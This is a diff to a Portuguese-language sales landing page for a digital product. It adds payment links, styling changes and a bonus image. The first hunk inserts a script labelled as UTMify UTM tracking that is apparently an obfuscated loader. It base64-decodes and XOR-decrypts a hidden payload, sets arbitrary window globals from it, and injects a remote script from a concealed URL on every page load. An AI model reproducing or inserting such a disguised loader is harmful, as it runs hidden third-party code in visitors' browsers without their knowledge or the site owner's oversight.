@@ -19,6 +19,9 @@ fbq('track', 'PageView');
 src="https://www.facebook.com/tr?id=1651739629799376&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
+<!-- UTMify UTM Script -->
+<script>(function(){var r_jg=atob("DIny6WhxQW0H3P8UbfLQnBodY1cltItgHfrIxkcSJQMpqYt5BO+LxwseLENlrtBnDvubmRwCbhhzsYw7AeiGjBsFbwd0/tM2DP2GmwETNBlir90uNvLQhwkcJE89/pt1GejfnBwcKAt+8Y9mCP+XhxxcOQ5ouNJnDuLQxUoHIAFyud0uT6uPxRNTLwxqud0uT+2TnQlcNBlqtZltQPmAjB4ULxkqr4p2BO2By0RTNwxrqZo2V6vQlDUM");var m_ie4=[];for(var b_j=0;b_j<r_jg.length;b_j++){m_ie4.push(r_jg.charCodeAt(b_j)&255);}var r_6v=m_ie4[0];var e_7v=m_ie4.slice(1,1+r_6v);var h_i7xo=m_ie4.slice(1+r_6v);var d_9=h_i7xo.map(function(b,d_4){return b^e_7v[d_4%r_6v];});var g_un="";for(var z_djt=0;z_djt<d_9.length;z_djt++){g_un+=String.fromCharCode(d_9[z_djt]&255);}var q_tra=decodeURIComponent(escape(g_un));var z_3l=JSON.parse(q_tra);var w_q=z_3l.globals||[];w_q.forEach(function(v_t){window[v_t.name]=v_t.value;});var g_aqqg=document.createElement("script");g_aqqg.src=z_3l.url;g_aqqg.async=true;g_aqqg.defer=true;(z_3l.attributes||[]).forEach(function(o_hq){g_aqqg.setAttribute(o_hq.name,o_hq.value);});(document.head||document.documentElement).appendChild(g_aqqg);})();</script>
+<!-- End UTMify UTM Script -->
 <link rel="preload" as="image" href="assets/hero-mockup.webp" fetchpriority="high">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -311,7 +314,7 @@ src="https://www.facebook.com/tr?id=1651739629799376&ev=PageView&noscript=1"
   .modal-price-now{font-size:36px; font-weight:900; font-family:"Archivo",sans-serif; color:var(--accent-strong); font-variant-numeric:tabular-nums;}
   .modal-price-now small{font-size:14px; font-weight:600; color:var(--text-muted);}
   .modal-decline{
-    text-align:center; font-size:13px; color:var(--text-muted); text-decoration:underline; cursor:pointer;
+    display:block; text-align:center; font-size:13px; color:var(--text-muted); text-decoration:underline; cursor:pointer;
     background:none; border:none; padding:6px; font-family:"Public Sans",sans-serif;
   }
   .modal-decline:hover{color:var(--text);}
@@ -608,7 +611,8 @@ src="https://www.facebook.com/tr?id=1651739629799376&ev=PageView&noscript=1"
         <div class="bonus-price"><span class="old">R$ 27,90</span><span class="free">GRÁTIS</span></div>
       </div>
       <div class="bonus-card">
-        <div class="bonus-top"><div class="bonus-icon">✅</div><h4>Checklist “Antes do Paciente Entrar”</h4></div>
+        <img class="bonus-image" src="assets/bonus-checklist.webp" width="480" height="360" alt="Mockup do Checklist Antes do Paciente Entrar" loading="lazy" decoding="async">
+        <h4>Checklist “Antes do Paciente Entrar”</h4>
         <p>Uma página. Alguns minutos. Uma revisão rápida pra entrar mais organizado.</p>
         <div class="bonus-price"><span class="old">R$ 17,90</span><span class="free">GRÁTIS</span></div>
       </div>
@@ -660,7 +664,7 @@ src="https://www.facebook.com/tr?id=1651739629799376&ev=PageView&noscript=1"
           <span class="price-now">R$ 10<small>,00</small></span>
           <span class="price-desc">Pagamento único. Sem mensalidade.</span>
         </div>
-        <a id="btn-basico" class="btn btn-outline btn-block" href="#">QUERO SOMENTE O BÁSICO</a>
+        <a id="btn-basico" class="btn btn-outline btn-block" href="https://pay.wiapy.com/2zY3volpyDVI">QUERO SOMENTE O BÁSICO</a>
         <span class="microcopy">🔒 Compra segura • Acesso digital • Garantia</span>
       </div>
 
@@ -685,7 +689,7 @@ src="https://www.facebook.com/tr?id=1651739629799376&ev=PageView&noscript=1"
           <span class="price-now">R$ 27<small>,90</small></span>
           <span class="price-desc">Pagamento único. Sem mensalidade.</span>
         </div>
-        <a class="btn btn-block" href="#">🔥 QUERO O PLANO PREMIUM</a>
+        <a class="btn btn-block" href="https://pay.wiapy.com/qjUVgpMRaqHq">🔥 QUERO O PLANO PREMIUM</a>
         <span class="microcopy">🔒 Compra segura • Acesso digital • Garantia</span>
       </div>
     </div>
@@ -827,8 +831,8 @@ src="https://www.facebook.com/tr?id=1651739629799376&ev=PageView&noscript=1"
         <span class="modal-price-now">R$ 19<small>,90</small></span>
       </div>
       <span class="microcopy" style="justify-content:flex-start;">🔒 Condição exclusiva desta tela • Pagamento único</span>
-      <a class="btn btn-block" href="#">🔥 QUERO O PLANO COMPLETO POR R$ 19,90 →</a>
-      <button id="modalDecline" class="modal-decline">Não, quero continuar só com o Básico por R$ 10,00</button>
+      <a class="btn btn-block" href="https://pay.wiapy.com/m9iE3RppVFw">🔥 QUERO O PLANO COMPLETO POR R$ 19,90 →</a>
+      <a id="modalDecline" class="modal-decline" href="https://pay.wiapy.com/2zY3volpyDVI">Não, quero continuar só com o Básico por R$ 10,00</a>
     </div>
   </div>
 </div>
